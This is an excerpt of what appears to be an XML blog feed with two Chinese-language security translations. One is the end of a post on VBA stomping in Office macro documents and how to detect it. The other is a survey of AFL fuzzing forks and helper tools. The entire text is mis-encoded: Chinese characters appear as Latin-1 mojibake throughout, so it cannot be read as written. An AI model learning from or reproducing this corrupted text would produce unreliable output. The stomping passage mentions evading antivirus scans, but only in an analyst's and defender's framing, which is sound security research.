ç«‹å³é€€å‡ºè€Œä¸æä¾›æŸ¥çœ‹åç¼–è¯‘æºçš„æœºä¼šã€‚è™½ç„¶æˆ‘ä»¬å·²ç»è¯æ˜Žâ€œç±»ä¼¼æ±‡ç¼–â€çš„ p-code æ˜¯å¯æå–çš„ï¼Œä½†æ˜¯ p-code å¾ˆéš¾è§£é‡Šï¼Œå¹¶ä¸”æ— æ³•åœ¨ VBA è°ƒè¯•å™¨ä¸­è¢«åˆ†æžã€‚æ­¤å¤– p-code ä»…åœ¨ç‰¹å®šçš„VBAç‰ˆæœ¬ä¸Šè¿è¡Œã€‚å‡ºäºŽè¿™äº›åŽŸå› ï¼Œè®¿é—® VBA æºä»£ç å¯¹åˆ†æžäººå‘˜æ¥è¯´æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„å¥½å¤„ã€‚ä½†æ˜¯å¦‚ä½•æ‰èƒ½ä¸ºè¿™æ ·çš„æ–‡ä»¶åšåˆ°è¿™ä¸€ç‚¹å‘¢ï¼Ÿ ç»è¿‡ä¸€äº›å®žéªŒï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªç®€å•çš„è§£å†³æ–¹æ¡ˆï¼Œå¯ä»¥åœ¨å®å¯ç”¨åŽç«‹å³åœæ­¢ MS Word æ‰§è¡Œä»»ä½•æ–¹æ³•ã€‚è¯·æ³¨æ„ï¼Œæ­¤è§£å†³æ–¹æ¡ˆé€‚ç”¨äºŽ Office 2007 ä»¥ä¸Šçš„æ–‡æ¡£ï¼Œæˆ‘ä»¬ç ”ç©¶è§£å†³è¾ƒæ—§çš„æ–‡æ¡£æ ¼å¼ã€‚Office 2007 ä»¥ä¸Šçš„è§£å†³æ–¹æ¡ˆæ˜¯ä»Ž .docm æ–‡ä»¶çš„ word ç›®å½•ä¸­åˆ é™¤ vbaData.xml æ–‡ä»¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼ˆè¿™å¯ä»¥é€šè¿‡ 7-Zip ç¨‹åºå®Œæˆï¼Œè€Œæ— éœ€æ‰‹åŠ¨è§£åŽ‹ç¼©å’Œé‡æ–°åŽ‹ç¼©æ–‡æ¡£ï¼‰ã€‚ çŽ°åœ¨æˆ‘ä»¬å¯ä»¥æ‰“å¼€æ–‡æ¡£å¹¶å¯ç”¨å†…å®¹ï¼Œä»Žè€Œåœ¨ VBA ä»£ç ç¼–è¾‘å™¨ä¸­æ˜¾ç¤ºåç¼–è¯‘çš„ p-codeï¼Œä½†ä¸æ‰§è¡Œä»£ç ã€‚å¦‚æžœæ¶æ„è½¯ä»¶ä½œè€…å·²é‡‡å–æŽªæ–½é˜»æ­¢åˆ†æžäººå‘˜è®¿é—® VBA æºä»£ç ï¼Œåˆ™è¿™ç§æ–¹æ³•å¯ä»¥èŠ‚çœæ—¶é—´ã€‚ åˆ é™¤ vbaData.xml çš„ä¸€ä¸ªæœ‰è¶£çš„å‰¯ä½œç”¨æ˜¯å®ƒä¼šå¯¼è‡´ MS Word åœ¨å®å¯¹è¯æ¡†ä¸­é”™è¯¯åœ°åˆ—å‡ºæ²¡æœ‰å®ï¼ˆå‚è§ä¸‹å›¾ï¼‰ã€‚ æ£€æµ‹æˆ‘ä»¬ç¼–å†™äº†ä¸€ä¸ªå¼€æºå·¥å…·ï¼Œç”¨äºŽæ£€æµ‹åä¸º VBA Seismograph çš„ Office æ–‡æ¡£ä¸­çš„ VBA stompingã€‚æ­¤å·¥å…·å·²åœ¨ Ubuntu 16.04 ä¸‹æµ‹è¯•ï¼Œå®ƒæ£€æµ‹å£°æ˜Žçš„å‡½æ•°/å˜é‡åç§°ã€å­—ç¬¦ä¸²æ–‡å­—ä»¥åŠå‡ºçŽ°åœ¨å·²ç¼–è¯‘çš„ p-code å’Œ Office æ–‡æ¡£çš„ VBA æºä»£ç ä¸­çš„æ³¨é‡Šè¡Œä¹‹é—´çš„å·®å¼‚ã€‚è¯¥å·¥å…·å¯åœ¨è¿™é‡Œæ‰¾åˆ°ã€‚ æ€»ç»“åœ¨è¿™ç¯‡åšå®¢æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬æ¼”ç¤ºäº†å¦‚ä½•ä¿®æ”¹æˆ–é”€æ¯ Office æ–‡æ¡£ä¸­åŽ‹ç¼©çš„ VBA æºä»£ç ï¼Œæ¥ç»•è¿‡ AV æ‰«æï¼Œå¹¶ä½¿æ¶æ„æ–‡æ¡£çš„æ‰‹åŠ¨åˆ†æžæ›´åŠ å›°éš¾ã€‚å¯¹æ­¤æŠ€æœ¯çš„é˜²å¾¡æ¶‰åŠæ£€æµ‹å’Œæ ‡è®°å…·æœ‰æœ‰æ•ˆ p-code ä½†æ— æ•ˆæˆ–ç¼ºå°‘ VBA æºä»£ç çš„æ–‡æ¡£ï¼Œæˆ–æ›´ä¸€èˆ¬åœ°ï¼Œæ£€æŸ¥åŽ‹ç¼© VBA æºä»£ç ä¸Žåç¼–è¯‘ p-code ä¹‹é—´çš„å·®å¼‚ã€‚ç›®å‰ï¼Œæˆ‘ä»¬è¿˜æ²¡æœ‰å‘çŽ°ä»»ä½•è¿›è¡Œæ­¤é¡¹æ£€æŸ¥çš„å•†ç”¨ AV è§£å†³æ–¹æ¡ˆï¼Œå› æ­¤è¿™æ˜¯ AV æ‰«æè§£å†³æ–¹æ¡ˆå¯ä»¥æ”¹è¿›çš„é¢†åŸŸã€‚ å‚è€ƒèµ„æ–™ https://vbastomp.com/ åŽŸæ–‡åœ°å€]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
      </categories>
      <tags>
        <tag>å¤–æ–‡ç¿»è¯‘</tag>
        <tag>VBA</tag>
        <tag>å®‰å…¨æŠ€æœ¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AFL åŠå…¶ç›¸å…³æ‹“å±•é¡¹ç›®æ€»ç»“]]></title>
    <url>%2F2019%2F04%2F29%2FAFL%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E6%8B%93%E5%B1%95%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[åŽŸæ–‡æ ‡é¢˜ Zoo AFL (Apr 24, 2019) ä½œè€…ï¼š@d1g1 æœ¬æ–‡ä¸»è¦è®¨è®ºçš„ä¸æ˜¯ç»å…¸ AFL æœ¬èº«ï¼Œè€Œæ˜¯ä¸ºå…¶è®¾è®¡çš„å·¥å…·ä»¥åŠå¯¹å…¶æœ¬èº«åšå‡ºçš„æ”¹è¿›ï¼Œæˆ‘ä»¬è®¤ä¸ºè¿™äº›æ”¹è¿›å¯ä»¥æ˜¾è‘—æé«˜æ¨¡ç³Šæµ‹è¯•çš„è´¨é‡ã€‚å¦‚æžœä½ æƒ³çŸ¥é“å¦‚ä½•æé«˜ AFL æ•ˆçŽ‡ä»¥åŠå¦‚ä½•æ›´å¿«åœ°æ‰¾åˆ°æ›´å¤šæ¼æ´žï¼Œè¯·ç»§ç»­é˜…è¯»ï¼ï¼ˆæŒç»­æ›´æ–°ä¸­ï¼‰ AFL æ˜¯ä»€ä¹ˆï¼Œå®ƒæœ‰ä»€ä¹ˆç”¨ï¼ŸAFLæ˜¯ä¸€ä¸ªè¦†ç›–å¯¼å‘æˆ–åŸºäºŽåé¦ˆçš„æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œå…³äºŽè¿™äº›æ¦‚å¿µçš„æ›´å¤šä¿¡æ¯å¯ä»¥åœ¨å‚è€ƒè¿™ç¯‡è®ºæ–‡ Fuzzing: Art, Science, and Engineeringã€‚æ€»ç»“ä¸€ä¸‹ AFLï¼š å®ƒæ”¹è¿›å¯æ‰§è¡Œæ–‡ä»¶ä»¥äº†è§£å®ƒå¦‚ä½•å½±å“è¦†ç›–èŒƒå›´ å˜å¼‚è¾“å…¥æ•°æ®ä»¥æœ€å¤§åŒ–è¦†ç›–èŒƒå›´ é‡å¤ä¸Šä¸€æ­¥ä»¥æ‰¾åˆ°ç¨‹åºå´©æºƒçš„ä½ç½® é€šè¿‡å®žè·µè¯æ˜Žå®ƒéžå¸¸æœ‰æ•ˆ å®ƒæ˜“äºŽä½¿ç”¨ å¦‚æžœä½ ä¸æ¸…æ¥š AFL æ˜¯ä»€ä¹ˆçš„è¯ï¼Œè¿™é‡Œæœ‰ä¸€äº›èµ„æºå¸®åŠ©ä½ ä¸Šæ‰‹å’Œç†è§£ï¼š é¡¹ç›®ä¸»é¡µ AFL ç»ƒä¹  AFL Demo â€” ä½¿ç”¨ AFL fuzz C++ ç¨‹åº AFL å‘çŽ°çš„æ¼æ´ž â€”ï¼ˆæˆªè‡³ 2017ï¼‰ åœ¨è¿™é‡Œä½ å¯ä»¥è¯»åˆ°å…³äºŽ AFL åœ¨æž„å»ºè¿‡ç¨‹ä¸­æ·»åŠ åˆ°ç¨‹åºä¸­çš„å†…å®¹ ä¸€äº›å…³äºŽ fuzz ç½‘ç»œç¨‹åºçš„æŠ€å·§ åœ¨å†™è¿™ç¯‡æ–‡ç« æ—¶ AFL çš„æœ€æ–°ç‰ˆæœ¬æ˜¯2.52bã€‚éšç€æ—¶é—´çš„æŽ¨ç§»ï¼Œä¸€äº›åˆ†æ”¯æ­£åœ¨è¢«çº³å…¥åˆ° AFL ä¸»åˆ†æ”¯ã€‚æŽ¥ä¸‹æ¥æˆ‘ä»¬ä¼šåˆ—ä¸¾å‡ ä¸ªæœ‰ç”¨çš„é™„ä»¶å·¥å…·ã€‚ å…³äºŽ Rode0day ç«žèµ› Rode0day ç«žèµ›æ¯æœˆä¸¾åŠžä¸€æ¬¡ï¼Œå‚èµ›è€…è¦åœ¨èŠ±è´¹æ›´å°‘æ—¶é—´çš„æƒ…å†µä¸‹åœ¨é¢„å…ˆåˆ¶ä½œçš„è¯­æ–™åº“ï¼ˆæ— è®ºæ˜¯å¦èŽ·å–æºä»£ç ï¼‰ä¸­æ‰¾åˆ°æœ€å¤šçš„æ¼æ´žã€‚å°±å…¶æœ¬è´¨è€Œè¨€ï¼ŒRode0day æ˜¯ AFL ä¸åŒåˆ†æ”¯ä¹‹é—´çš„äº‰æ–—ã€‚ ä¸€äº›AFLç”¨æˆ·æŒ‡å‡ºï¼ŒAFL çš„ä½œè€… Michal Zalewski æ˜¾ç„¶å·²ç»æ”¾å¼ƒè¯¥é¡¹ç›®ï¼Œ å› ä¸ºä¸Šæ¬¡çš„æ”¹è¿›æ—¥æœŸè¿˜å¾—è¿½æº¯åˆ° 2017 å¹´ 11 æœˆ 5 æ—¥ã€‚è¿™å¯èƒ½ä¸Žä»–ç¦»å¼€ Google å¹¶å¼€å±•ä¸€äº›æ–°é¡¹ç›®æœ‰å…³ã€‚ å› æ­¤ç”¨æˆ·å¼€å§‹ä¸ºæœ€æ–°çš„ç‰ˆæœ¬ 2.52b åˆ¶ä½œæ–°çš„è¡¥ä¸)ã€‚ AFL è¿˜æœ‰ä¸åŒçš„å˜ä½“å’Œè¡ç”Ÿç‰©ï¼Œå…è®¸æ¨¡ç³Šæµ‹è¯• Pythonï¼ŒGoï¼ŒRustï¼ŒOCamlï¼ŒGCJ Javaï¼Œå†…æ ¸ç³»ç»Ÿè°ƒç”¨ï¼Œç”šè‡³æ•´ä¸ªè™šæ‹Ÿæœºã€‚ AFL å¯¹å…¶å®ƒè¯­è¨€çš„æ”¯æŒ python-afl â€” Python afl.rs â€” Rust afl-fuzz-js â€” Javascript java-afl â€” Java kelinci â€” Javaï¼ˆç›¸å…³æ–‡ç« ï¼‰ javan-warty-pig â€” JVM afl-swift â€” Swift ocamlopt-afl â€” OCaml sharpfuzz â€” .Net AFL é™„å±žå·¥å…·æœ¬èŠ‚æˆ‘ä»¬æ”¶é›†äº† AFL çš„å„ç§è„šæœ¬å’Œå·¥å…·ï¼Œå¹¶å°†å®ƒä»¬åˆ†ä¸ºå‡ ç±»ï¼š å´©æºƒå¤„ç† afl-utils â€” è‡ªåŠ¨å¤„ç†/åˆ†æžå´©æºƒå’Œå‡å°‘æµ‹è¯•ç”¨ä¾‹æ•°é‡ afl-crash-analyzer â€” AFL å´©æºƒåˆ†æžç¨‹åº fuzzer-utils â€” åˆ†æžç»“æžœ atriage â€” ç®€å•çš„åˆ†ç±»å·¥å…· afl-kit â€” Python å®žçŽ°çš„ afl-cmin AFLize â€” ç”Ÿæˆé€‚åˆ AFL çš„ debian åŒ…çš„æž„å»º afl-fid â€” å¤„ç†è¾“å…¥æ•°æ® ä»£ç è¦†ç›–çŽ‡ afl-cov â€” æä¾›äººæ€§åŒ–çš„è¦†ç›–çŽ‡æ•°æ® count-afl-calls â€” ä½¿ç”¨è„šæœ¬è®¡ç®—äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„æ’æ¡©å—æ•°ï¼Œè¯„ä¼°å…¶å æ¯” afl-sancov â€” ç±»ä¼¼äºŽ afl-cov ä½†ä½¿ç”¨ clangçš„æ¶ˆæ¯’æœºåˆ¶ï¼ˆsanitizerï¼‰ covnavi â€” æ€ç§‘ Talos å¼€å‘çš„ç”¨äºŽä»£ç è¦†ç›–å’Œåˆ†æžçš„è„šæœ¬ LAF LLVM Passes â€” ç±»ä¼¼äºŽ AFL çš„è¡¥ä¸é›†åˆï¼Œå¯ä»¥æ”¹è¿›ä»£ç ä½¿å…¶æ›´å®¹æ˜“æ‰¾åˆ°åˆ†æ”¯ ä¸€äº›ç”¨äºŽæœ€å°åŒ–æµ‹è¯•ç”¨ä¾‹çš„è„šæœ¬ afl-pytmin â€” ä¸€ä¸ª afl-tmin çš„åŒ…è£…å™¨ï¼Œå®ƒè¯•å›¾é€šè¿‡ä½¿ç”¨å¤š CPU å†…æ ¸æ¥åŠ é€Ÿæœ€å°åŒ–æµ‹è¯•ç”¨ä¾‹çš„è¿‡ç¨‹ afl-ddmin-mod â€” åŸºäºŽ ddmin ç®—æ³•çš„ afl-tmin halfempty â€” æ¥è‡ª Tavis Ormandy åŸºäºŽå¹¶è¡ŒåŒ–çš„å¿«é€Ÿæœ€å°åŒ–æµ‹è¯•ç”¨ä¾‹çš„ç¨‹åº åˆ†å¸ƒå¼æ‰§è¡Œ disfuzz-afl â€” AFL çš„åˆ†å¸ƒå¼æ¨¡ç³Šæµ‹è¯• AFLDFF â€” AFL åˆ†å¸ƒå¼æ¨¡ç³Šæµ‹è¯•æ¡†æž¶ afl-launch â€” AFL å¤šå®žä¾‹æ‰§è¡Œ afl-mothership â€” AWS äº‘ä¸Šå¤šåŒæ­¥ AFL çš„ç®¡ç†å’Œæ‰§è¡Œ afl-in-the-cloud â€” å¦ä¸€ä¸ªåœ¨ AWS ä¸­è¿è¡Œ AFL çš„è„šæœ¬ VU_BSc_project â€” ä½¿ç”¨ libFuzzer å’Œ AFL å¯¹å¼€æºåº“è¿›è¡Œæ¨¡ç³Šæµ‹è¯• æœ€è¿‘æœ‰ä¸€ç¯‡æ–‡ç«  Scaling AFL to a 256 thread machineã€‚ éƒ¨ç½²ï¼Œç®¡ç†ï¼Œç›‘æŽ§ï¼ŒæŠ¥å‘Š afl-other-arch â€” ç”¨äºŽæ·»åŠ å¯¹å„ç§éžx86ä½“ç³»ç»“æž„çš„æ”¯æŒ afl-trivia â€” ç®€åŒ– AFL ç®¡ç†çš„è„šæœ¬ afl-monitor â€” AFL ç›‘æŽ§è„šæœ¬ afl-manager â€” Python å®žçŽ°çš„ç”¨äºŽç®¡ç† multi-afl çš„ Web æœåŠ¡å™¨ afl-tools â€” å¸¦æœ‰ afl-latest, afl-dyninst å’Œ Triforce-afl çš„ docker é•œåƒ afl-remote â€” è¿œç¨‹ç®¡ç† AFL å®žä¾‹çš„ Web æœåŠ¡å™¨ åŒ…è£…å™¨ï¼ˆwrapperï¼‰ phuzzer - åŸºäºŽ Python ä¸Ž AFL äº¤äº’ AFL æ”¹è¿›AFL å¯¹æ¼æ´žç ”ç©¶äººå‘˜å’Œæ¨¡ç³Šæµ‹è¯•æœ¬èº«äº§ç”Ÿäº†å·¨å¤§çš„å½±å“ï¼Œä»–ä»¬å¼€å§‹æ ¹æ®åŽŸå§‹ AFL è¿›è¡Œæ”¹è¿›ã€‚åœ¨ä¸åŒçš„æƒ…å†µä¸‹ï¼Œä¸ŽåŽŸå§‹AFLç›¸æ¯”ï¼Œæ¯ä¸ªæ”¹è¿›éƒ½æœ‰å…¶è‡ªèº«çš„ä¼˜ç¼ºç‚¹ã€‚ å‡ ä¹Žæ‰€æœ‰æ”¹è¿›ç‰ˆæœ¬å¯ä»¥åœ¨ hub.docker.com æ‰¾åˆ°ã€‚ ç›®çš„æ˜¯ä»€ä¹ˆï¼Ÿ æé«˜é€Ÿåº¦å¹¶/æˆ–æé«˜ä»£ç è¦†ç›–çŽ‡ ç®—æ³• çŽ¯å¢ƒ æ“ä½œç³»ç»Ÿ ç¡¬ä»¶ æ— æºç çŽ¯å¢ƒ ä»£ç æ¨¡æ‹Ÿ ä»£ç æ’æ¡© é™æ€ åŠ¨æ€ AFL é»˜è®¤æ¨¡å¼åœ¨ç»§ç»­ç ”ç©¶ AFL çš„ä¸åŒæ”¹è¿›å’Œåˆ†æ”¯ä¹‹å‰ï¼Œæˆ‘ä»¬å¿…é¡»è®¨è®ºä¸¤ç§é‡è¦çš„æ¨¡å¼ï¼Œè¿™äº›æ¨¡å¼åœ¨è¿‡åŽ»ä¹Ÿæœ‰è¿‡æ”¹è¿›ä½†æœ€ç»ˆè¢«åˆå¹¶ã€‚å®ƒä»¬æ˜¯ Syzygy å’Œ QEMUã€‚ Syzygy æ¨¡å¼ â€” instrument.exe ä¸­å·¥ä½œçš„æ¨¡å¼1instrument.exe --mode=afl --input-image=test.exe --output-image=test.instr.exe Syzygy å…è®¸ä½¿ç”¨ AFL é™æ€é‡å†™ PE32 äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½†éœ€è¦ç¬¦å·å’Œé¢å¤–çŽ¯å¢ƒçš„æ‰èƒ½è¯†åˆ« WinAFL å†…æ ¸ã€‚ QEMU æ¨¡å¼ â€” QEMU ä¸‹çš„å·¥ä½œæ–¹å¼è§ Internals of AFL fuzzer â€” QEMU Instrumentationä½¿ç”¨ QEMU å®žçŽ°å¯¹äºŒè¿›åˆ¶æ–‡ä»¶çš„æ”¯æŒåœ¨ç‰ˆæœ¬ 1.31b ä¸­è¢«æ·»åŠ åˆ° AFL å¤„ç†æµç¨‹ä¸Šæ¸¸ã€‚AFL QEMU æ¨¡å¼ä½¿ç”¨ QEMU tcgï¼ˆä¸€ä¸ªå¾®å°çš„ä»£ç ç”Ÿæˆå™¨ï¼‰äºŒè¿›åˆ¶è½¬æ¢å¼•æ“Žçš„äºŒè¿›åˆ¶æ’æ¡©åŠŸèƒ½ã€‚ä¸ºæ­¤ï¼ŒAFL æœ‰ä¸€ä¸ª QEMU çš„æž„å»ºè„šæœ¬ï¼Œå®ƒæå–ç‰¹å®šç‰ˆæœ¬ QEMUï¼ˆ2.10.0ï¼‰çš„æºä»£ç ï¼Œå°†å®ƒä»¬æ”¾åˆ°å‡ ä¸ªå°çš„è¡¥ä¸ä¸Šï¼Œå¹¶ä¸ºæŒ‡å®šæž¶æž„æž„å»ºã€‚ç„¶åŽï¼Œåˆ›å»ºåä¸º afl-qemu-trace çš„æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å®žé™…ä¸Šæ˜¯ QEMU ç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿï¼ˆä»…å¯æ‰§è¡ŒELFæ–‡ä»¶ï¼‰çš„æ–‡ä»¶ã€‚å› æ­¤ï¼ŒAFL å¯ä»¥ä½¿ç”¨ä¸åŒä½“ç³»æž¶æž„ï¼ˆQEMU æ”¯æŒï¼‰ä¸­ elf äºŒè¿›åˆ¶æ–‡ä»¶çš„åé¦ˆè¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚æ­¤å¤–ï¼Œè¿˜æœ‰è®¸å¤š AFL å·¥å…·ï¼Œæ¯”å¦‚ä»Žæ˜¾ç¤ºå™¨ä¸ŠèŽ·å–æœ‰å…³å½“å‰ä¼šè¯çš„ä¿¡æ¯ï¼Œä»¥åŠ afl-analyze ç­‰é«˜çº§å†…å®¹ã€‚ä½†åŒæ—¶ AFL ä¹Ÿä¼šå—åˆ° QEMU çš„å±€é™ï¼Œ æ¯”å¦‚å¦‚æžœå·¥å…·é“¾ä½¿ç”¨ç¡¬ä»¶ SoC åŠŸèƒ½æž„å»ºæ–‡ä»¶ï¼ˆè¯¥åŠŸèƒ½å¯åŠ¨äºŒè¿›åˆ¶å¹¶ä¸” QEMU ä¸æ”¯æŒï¼‰ï¼Œåˆ™åªè¦æœ‰ç‰¹å®šæŒ‡ä»¤æˆ–ä½¿ç”¨ç‰¹å®š MMIOï¼Œæ¨¡ç³Šæµ‹è¯•å°±ä¼šä¸­æ–­ã€‚ è¿™é‡Œæ˜¯ QEMU æ¨¡å¼çš„å¦ä¸€ä¸ªæœ‰è¶£çš„åˆ†æ”¯ï¼Œå…¶ä¸­ä½¿ç”¨TCGä»£ç æ’æ¡©å’Œç¼“å­˜ï¼Œé€Ÿåº¦æé«˜äº†3-4å€ã€‚ åˆ†æ”¯AFL çš„åˆ†æ”¯é¦–å…ˆä¸Žç»å…¸ AFL ç®—æ³•çš„å˜åŒ–å’Œæ”¹è¿›æœ‰å…³ã€‚ pe-afl â€” å¯¹åœ¨ Windows æ“ä½œç³»ç»Ÿä¸­æ²¡æœ‰æºä»£ç çš„ PE æ–‡ä»¶è¿›è¡Œæ¨¡ç³Šæµ‹è¯•çš„æ”¹è¿›ã€‚fuzzer ä½¿ç”¨ IDA Pro åˆ†æžç›®æ ‡ç¨‹åºï¼Œå¹¶ç”Ÿæˆç”¨äºŽæŽ¥ä¸‹æ¥é™æ€æ’æ¡©çš„ä¿¡æ¯ã€‚ç„¶åŽç”¨ AFL å¯¹æ’æ¡©åŽçš„ç¨‹åºè¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚ afl-cygwin â€” å°è¯•ä½¿ç”¨ Cygwin å°†ç»å…¸ AFL ç§»æ¤åˆ°Windowsã€‚ç„¶è€Œå®ƒæœ‰å¾ˆå¤šé”™è¯¯ä¸”å¾ˆæ…¢ï¼Œä½œè€…å·²ç»æ”¾å¼ƒäº†å¼€å‘ AFLFastï¼ˆä½¿ç”¨ Power Schedule æ‰©å±• AFLï¼‰ â€” æœ€æ—©çš„ AFL åˆ†æ”¯ä¹‹ä¸€ã€‚å®ƒå¢žåŠ äº†å¯å‘å¼åŠŸèƒ½ï¼Œå…è®¸å®ƒåœ¨çŸ­æ—¶é—´å†…é€šè¿‡æ›´å¤šè·¯å¾„ FairFuzz â€” AFL çš„æ‰©å±•ï¼Œé’ˆå¯¹éš¾æŠµè¾¾çš„åˆ†æ”¯ï¼ˆåˆ©ç”¨Branch Maskï¼‰ AFLGo â€” AFL çš„æ‰©å±•ï¼ŒèŽ·å–ä»£ç çš„æŸäº›éƒ¨åˆ†è€Œä¸æ˜¯å®Œæ•´çš„ç¨‹åºè¦†ç›–ï¼Œå¯ç”¨äºŽæµ‹è¯•è¡¥ä¸æˆ–æ–°æ·»åŠ çš„ä»£ç ç‰‡æ®µ PerfFuzz â€” AFL çš„æ‰©å±•ï¼Œç”¨äºŽæŸ¥æ‰¾å¯èƒ½æ˜¾ç€å‡æ…¢ç¨‹åºé€Ÿåº¦çš„æµ‹è¯•ç”¨ä¾‹ Pythia â€” AFL çš„æ‰©å±•ï¼Œé¢„æµ‹æ‰¾åˆ°æ–°è·¯å¾„çš„éš¾åº¦ Angora â€” æœ€æ–°çš„ fuzzer ä¹‹ä¸€ï¼Œç”¨ Rust è¯­è¨€ç¼–å†™ï¼Œä½¿ç”¨æ–°çš„ç­–ç•¥è¿›è¡Œå˜å¼‚å¹¶å¢žåŠ è¦†ç›–èŒƒå›´ã€‚ Neuzz â€” ç”¨ç¥žç»ç½‘ç»œè¿›è¡Œæ¨¡ç³Šæµ‹è¯• UnTracer-AFL â€” å°† AFl ä¸Ž UnTracer é›†æˆä»¥è¿›è¡Œæœ‰æ•ˆè·Ÿè¸ª Qsym â€” é’ˆå¯¹æ··åˆæ¨¡ç³Šæµ‹è¯•çš„å®žç”¨æ··åˆæ‰§è¡Œï¼ˆconcolic executionï¼‰å¼•æ“Žã€‚ä»Žæœ¬è´¨ä¸Šè®²ï¼Œå®ƒæ˜¯ä¸€ä¸ªç¬¦å·æ‰§è¡Œå¼•æ“Žï¼ˆåŸºæœ¬ç»„ä»¶ä½œä¸º intel pin çš„æ’ä»¶æ¥å®žçŽ°ï¼‰ï¼Œå®ƒä¸Ž AFL ä¸€èµ·æ‰§è¡Œæ··åˆæ¨¡ç³Šæµ‹è¯•ã€‚è¿™æ˜¯åŸºäºŽåé¦ˆçš„æ¨¡ç³Šæµ‹è¯•æ¼”å˜çš„ä¸€ä¸ªé˜¶æ®µï¼Œéœ€è¦å•ç‹¬è®¨è®ºã€‚å®ƒçš„ä¸»è¦ä¼˜ç‚¹æ˜¯å¯ä»¥ç›¸å¯¹å¿«é€Ÿåœ°è¿›è¡Œæ··åˆæ‰§è¡Œã€‚è¿™æ˜¯ç”±äºŽæœ¬æœºæ‰§è¡Œå‘½ä»¤è€Œæ²¡æœ‰ä»£ç ã€å¿«ç…§å’Œä¸€äº›å¯å‘å¼çš„ä¸­é—´è¡¨ç¤ºã€‚å®ƒä½¿ç”¨æ—§ç‰ˆæœ¬çš„Intel pinï¼ˆç”±äºŽ libz3 å’Œå…¶ä»– DBT ä¹‹é—´çš„æ”¯æŒé—®é¢˜ï¼‰ï¼Œç›®å‰æ”¯æŒELF x86 å’Œ x86_64 æž¶æž„ Superion â€” ç°ç›’æ¨¡ç³Šæµ‹è¯•å™¨ï¼Œå…¶ä¼˜ç‚¹æ˜¯é™¤äº†æ’æ¡©ç¨‹åºå¤–ï¼Œå®ƒè¿˜ä½¿ç”¨ ANTLR è¯­æ³•èŽ·å–è¾“å…¥æ•°æ®çš„è§„èŒƒï¼Œç„¶åŽåœ¨æ­¤è¯­æ³•çš„å¸®åŠ©ä¸‹æ‰§è¡Œå˜å¼‚ AFLSmart â€” å¦ä¸€ä¸ªç°ç›’æ¨¡ç³Šæµ‹è¯•å™¨ï¼Œå®ƒä»¥ Peach ä½¿ç”¨çš„æ ¼å¼èŽ·å¾—è¾“å…¥æ•°æ®çš„è§„èŒƒ æœ‰è®¸å¤šç ”ç©¶è®ºæ–‡è‡´åŠ›äºŽå®žçŽ° AFL è¢«æ”¹è¿›çš„æ–°æ–¹æ³•å’Œæ¨¡ç³Šæµ‹è¯•æŠ€æœ¯ã€‚ç”±äºŽå®ƒä»¬åªæœ‰ç™½çš®ä¹¦ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”šè‡³æ²¡æœ‰æåˆ°è¿™äº›ã€‚å¦‚æžœä½ æ„¿æ„ï¼Œä½ å¯ä»¥æœç´¢å®ƒä»¬ã€‚ä¾‹å¦‚æœ€æ–°çš„ä¸€äº›æœ‰ CollAFL: Path Sensitive Fuzzingã€EnFuzzã€Efficient approach to fuzzing interpretersã€ML ç”¨äºŽ AFL ç­‰ã€‚ åŸºäºŽ QEMU çš„æ”¹è¿› TriforceAFL â€” AFL/QEMUå¯¹ç³»ç»Ÿå®Œå…¨æ¨¡æ‹Ÿæ¥è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚æ˜¯ç”± nccgroup æä¾›çš„ä¸€ä¸ªåˆ†æ”¯ã€‚å®ƒå…è®¸åœ¨ QEMU æ¨¡å¼ä¸‹å¯¹æ•´ä¸ªæ“ä½œç³»ç»Ÿè¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚å®ƒæ˜¯é€šè¿‡ä¸€ä¸ªç‰¹æ®ŠæŒ‡ä»¤ï¼ˆaflCall (0f 24)ï¼‰ï¼ˆåœ¨ QEMU x64 CPU ä¸­æ·»åŠ ï¼‰å®žçŽ°çš„ã€‚ç„¶è€Œå®ƒä¸å†å—æ”¯æŒ; æ”¯æŒ AFL çš„æœ€åŽä¸€ä¸ªç‰ˆæœ¬æ˜¯2.06b TriforceLinuxSyscallFuzzer â€” Linux ç³»ç»Ÿè°ƒç”¨çš„æ¨¡ç³Šæµ‹è¯• afl-qai â€” ä¸€ä¸ªå¸¦æœ‰ QEMU å¢žå¼ºæ’æ¡©ï¼ˆqaiï¼‰çš„å°åž‹æ¼”ç¤ºé¡¹ç›®ã€‚ åŸºäºŽ KLEE çš„æ”¹è¿› kleefl â€” é€šè¿‡ç¬¦å·æ‰§è¡Œç”Ÿæˆæµ‹è¯•ç”¨ä¾‹ï¼ˆåœ¨å¤§ç¨‹åºä¸Šéžå¸¸æ…¢ï¼‰ åŸºäºŽ Unicorn çš„æ”¹è¿› afl-unicorn â€” å…è®¸é€šè¿‡åœ¨ Unicorn Engine ä¸Šæ¨¡æ‹Ÿä»£ç ç‰‡æ®µè¿›è¡Œæ¨¡ç³Šæµ‹è¯• æˆ‘ä»¬åœ¨å®žè·µä¸­æˆåŠŸä½¿ç”¨äº† AFL çš„è¿™ç§æ”¹è¿›ï¼Œç”±äºŽç›®æ ‡æ˜¯åœ¨ SOC ä¸Šæ‰§è¡Œçš„æŸä¸ª RTOSï¼ˆreal-time operating systemï¼Œå®žæ—¶æ“ä½œç³»ç»Ÿï¼‰çš„ä»£ç åŒºåŸŸï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•ä½¿ç”¨QEMUæ¨¡å¼ã€‚åœ¨æˆ‘ä»¬æ²¡æœ‰æºä»£ç çš„æƒ…å†µä¸‹ï¼ˆæˆ‘ä»¬æ— 